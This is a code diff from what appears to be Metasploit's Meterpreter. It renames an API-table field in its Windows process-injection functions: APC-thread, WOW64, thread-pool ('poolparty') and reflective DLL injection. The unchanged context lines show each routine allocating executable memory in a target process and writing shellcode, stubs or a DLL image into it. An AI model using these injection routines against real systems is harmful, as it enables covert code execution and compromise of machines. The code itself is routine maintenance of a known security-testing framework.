@@ -204,7 +204,7 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 
 				// alloc the address of the wow64!Wow64ApcRoutine export in the remote process...
 				// TO-DO: parse the PE64 executable wow64.dll to get this at runtime.
-				lpRemoteAddress = met_api->winapi.kernel32.VirtualAllocEx( hProcess, (LPVOID)0x6B0095F0, 8192, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+				lpRemoteAddress = met_api->win_api.kernel32.VirtualAllocEx( hProcess, (LPVOID)0x6B0095F0, 8192, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 				if( !lpRemoteAddress )
 					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: VirtualAllocEx 0x6B0095F0 failed" );
 
@@ -217,10 +217,10 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 				
 				memset( lpNopSled, 0x90, mbi.RegionSize );
 				
-				if( !met_api->winapi.kernel32.WriteProcessMemory( hProcess, lpRemoteAddress, lpNopSled, mbi.RegionSize, NULL ) )
+				if( !met_api->win_api.kernel32.WriteProcessMemory( hProcess, lpRemoteAddress, lpNopSled, mbi.RegionSize, NULL ) )
 					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory lpNopSled failed" )
 				
-				if( !met_api->winapi.kernel32.WriteProcessMemory( hProcess, ((BYTE*)lpRemoteAddress + mbi.RegionSize - sizeof(bStub)), bStub, sizeof(bStub), NULL ) )
+				if( !met_api->win_api.kernel32.WriteProcessMemory( hProcess, ((BYTE*)lpRemoteAddress + mbi.RegionSize - sizeof(bStub)), bStub, sizeof(bStub), NULL ) )
 					BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory bStub failed" )
 
 				free( lpNopSled );
@@ -248,7 +248,7 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: Thread32First failed" )
 		
 		// Allocate memory for the apc stub and context
-		lpRemoteApcStub = met_api->winapi.kernel32.VirtualAllocEx( hProcess, NULL, dwApcStubLength + sizeof(APCCONTEXT), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+		lpRemoteApcStub = met_api->win_api.kernel32.VirtualAllocEx( hProcess, NULL, dwApcStubLength + sizeof(APCCONTEXT), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 		if( !lpRemoteApcStub )
 			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: VirtualAllocEx failed" )
 
@@ -258,11 +258,11 @@ DWORD inject_via_apcthread( Remote * remote, Packet * response, HANDLE hProcess,
 		dprintf( "[INJECT] -- dwMeterpreterArch=%s, lpRemoteApcStub=0x%08X, lpRemoteApcContext=0x%08X", ( dwMeterpreterArch == 2 ? "x64" : "x86" ), lpRemoteApcStub, lpRemoteApcContext );
 
 		// Write the apc stub to memory...
-		if( !met_api->winapi.kernel32.WriteProcessMemory( hProcess, lpRemoteApcStub, lpApcStub, dwApcStubLength, NULL ) )
+		if( !met_api->win_api.kernel32.WriteProcessMemory( hProcess, lpRemoteApcStub, lpApcStub, dwApcStubLength, NULL ) )
 			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory lpRemoteApcStub failed" )
 
 		// Write the apc context to memory...
-		if( !met_api->winapi.kernel32.WriteProcessMemory( hProcess, lpRemoteApcContext, (LPCVOID)&ctx, sizeof(APCCONTEXT), NULL ) )
+		if( !met_api->win_api.kernel32.WriteProcessMemory( hProcess, lpRemoteApcContext, (LPCVOID)&ctx, sizeof(APCCONTEXT), NULL ) )
 			BREAK_ON_ERROR( "[INJECT] inject_via_apcthread: WriteProcessMemory lpRemoteApcContext failed" )
 
 		do
@@ -380,12 +380,12 @@ DWORD inject_via_remotethread_wow64( HANDLE hProcess, LPVOID lpStartAddress, LPV
 		}
 
 		// alloc a RWX buffer in this process for the EXECUTEX64 function
-		pExecuteX64 = (EXECUTEX64)met_api->winapi.kernel32.VirtualAlloc( NULL, sizeof(migrate_executex64), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+		pExecuteX64 = (EXECUTEX64)met_api->win_api.kernel32.VirtualAlloc( NULL, sizeof(migrate_executex64), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 		if( !pExecuteX64 )
 			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: VirtualAlloc pExecuteX64 failed" )
 	
 		// alloc a RWX buffer in this process for the X64FUNCTION function (and its context)
-		pX64function = (X64FUNCTION)met_api->winapi.kernel32.VirtualAlloc( NULL, sizeof(migrate_wownativex)+sizeof(WOW64CONTEXT), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
+		pX64function = (X64FUNCTION)met_api->win_api.kernel32.VirtualAlloc( NULL, sizeof(migrate_wownativex)+sizeof(WOW64CONTEXT), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 		if( !pX64function )
 			BREAK_ON_ERROR( "[INJECT] inject_via_remotethread_wow64: VirtualAlloc pX64function failed" )
 		
@@ -548,17 +548,17 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] DuplicateHandle failed");
 		}
 
-		lpPoolPartyStub = met_api->winapi.kernel32.VirtualAllocEx(hProcess, NULL, dwStubSize + sizeof(POOLPARTYCONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		lpPoolPartyStub = met_api->win_api.kernel32.VirtualAllocEx(hProcess, NULL, dwStubSize + sizeof(POOLPARTYCONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 		dprintf("[INJECT][inject_via_poolparty] ctx [%p] lpStartAddress: %p lpParameter %p hTriggerEvent %p", (LPBYTE) lpPoolPartyStub + dwStubSize, ctx.s.lpStartAddress, ctx.p.lpParameter, ctx.e.hTriggerEvent);
 		if (!lpPoolPartyStub) {
 			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] VirtualAllocEx failed!");
 		}
 		
-		if (!met_api->winapi.kernel32.WriteProcessMemory(hProcess, lpPoolPartyStub, lpStub, dwStubSize, NULL)) {
+		if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, lpPoolPartyStub, lpStub, dwStubSize, NULL)) {
 			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] Cannot write custom shellcode!");
 		}
 
-		if (!met_api->winapi.kernel32.WriteProcessMemory(hProcess, (BYTE *)lpPoolPartyStub + dwStubSize, &ctx, sizeof(POOLPARTYCONTEXT), NULL)) {
+		if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, (BYTE *)lpPoolPartyStub + dwStubSize, &ctx, sizeof(POOLPARTYCONTEXT), NULL)) {
 			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] Cannot write poolparty shellcode prologue!");
 		}
 
@@ -658,11 +658,11 @@ DWORD inject_dll(DWORD dwPid, DWORD dwDestinationArch, LPVOID lpDllBuffer, DWORD
 			if (stArgSize)
 			{
 				// alloc some space and write the argument which we will pass to the injected dll...
-				lpRemoteArg = met_api->winapi.kernel32.VirtualAllocEx(hProcess, NULL, stArgSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+				lpRemoteArg = met_api->win_api.kernel32.VirtualAllocEx(hProcess, NULL, stArgSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 				if (!lpRemoteArg)
 					BREAK_ON_ERROR("[INJECT] inject_dll. VirtualAllocEx 1 failed");
 
-				if (!met_api->winapi.kernel32.WriteProcessMemory(hProcess, lpRemoteArg, lpArg, stArgSize, NULL))
+				if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, lpRemoteArg, lpArg, stArgSize, NULL))
 					BREAK_ON_ERROR("[INJECT] inject_dll. WriteProcessMemory 1 failed");
 			}
 			else
@@ -673,12 +673,12 @@ DWORD inject_dll(DWORD dwPid, DWORD dwDestinationArch, LPVOID lpDllBuffer, DWORD
 		}
 
 		// alloc memory (RWX) in the host process for the image...
-		lpRemoteLibraryBuffer = met_api->winapi.kernel32.VirtualAllocEx(hProcess, NULL, dwDllLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		lpRemoteLibraryBuffer = met_api->win_api.kernel32.VirtualAllocEx(hProcess, NULL, dwDllLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 		if (!lpRemoteLibraryBuffer)
 			BREAK_ON_ERROR("[INJECT] inject_dll. VirtualAllocEx 2 failed");
 
 		// write the image into the host process...
-		if (!met_api->winapi.kernel32.WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpDllBuffer, dwDllLength, NULL))
+		if (!met_api->win_api.kernel32.WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpDllBuffer, dwDllLength, NULL))
 			BREAK_ON_ERROR("[INJECT] inject_dll. WriteProcessMemory 2 failed");
 
 		// add the offset to ReflectiveLoader() to the remote library address...
